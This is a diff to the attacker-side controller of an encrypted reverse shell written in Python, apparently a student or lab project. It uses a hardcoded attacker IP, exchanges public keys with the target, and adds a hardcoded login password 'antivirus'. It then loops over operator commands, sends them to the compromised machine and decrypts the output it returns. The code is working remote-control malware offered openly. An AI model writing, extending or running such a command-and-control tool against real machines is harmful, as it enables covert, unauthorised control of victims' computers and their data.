@@ -2,6 +2,7 @@
 import socket
 from cryptidy import asymmetric_encryption as ae
 
+PASSWORD = 'antivirus'
 EOF = b'dhruv.anish.samarth.blah.blah'
 
 ATTACKER_IP = '10.0.2.4' # Change this if your attacker machine's IP is different
@@ -27,6 +28,11 @@ conn.send(pub_key.encode())
 # receive the target's public key
 target_pub_key = conn.recv(1024).decode()
 
+# send password to confirm login
+conn.send(ae.encrypt_message(PASSWORD, target_pub_key))
+result = conn.recv(1024).decode()
+print(result, end='')
+
 while True:
     command = input("Enter command to execute or 'exit' to quit: ")
     if command.lower() == 'exit':
@@ -39,7 +45,7 @@ while True:
     if len(encrypted_output) > 0:
         while encrypted_output[-len(EOF):] != EOF:
             encrypted_output += conn.recv(1024)
-        
+
         encrypted_output = encrypted_output[:-len(EOF)]
         _, output = ae.decrypt_message(encrypted_output, priv_key)
         print(output, end="")
